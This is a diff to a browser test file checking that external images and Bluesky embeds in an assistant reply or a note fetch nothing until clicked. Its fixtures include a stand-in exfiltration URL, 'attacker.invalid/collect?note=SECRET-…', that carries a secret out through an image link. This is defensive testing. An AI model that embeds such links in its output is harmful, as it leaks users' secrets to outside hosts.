@@ -93,6 +93,11 @@ test("an assistant reply's external image and Bluesky post fetch nothing until c
       "https://attacker.invalid/collect?note=SECRET-tk9i",
     ]);
     await expect(panel.getByRole("img", { name: "citation" })).toBeVisible();
+    // One click loads one item: with the image fully rendered, the post is
+    // still gated and its handle lookup has not run.
+    expect(external).toEqual(["https://attacker.invalid/collect?note=SECRET-tk9i"]);
+    await expect(postButton).toBeVisible();
+    await expect(panel.locator("iframe")).toHaveCount(0);
 
     await postButton.click();
     await expect.poll(() => external.some((u) => u.includes("resolveHandle"))).toBe(true);
@@ -127,7 +132,7 @@ test("a note's external image waits for a click; its Bluesky post still embeds",
     await page.goto(`/page/${encodeURIComponent(title)}`);
     await expect(page.locator("iframe.bluesky-embed")).toBeVisible();
 
-    await expect(page.locator("img.asset-image")).toHaveCount(0);
+    await expect(page.locator('img[src*="attacker.invalid"]')).toHaveCount(0);
     expect(external.filter((u) => u.includes("attacker.invalid"))).toEqual([]);
 
     await page.getByRole("button", { name: "image from attacker.invalid: pic" }).click();
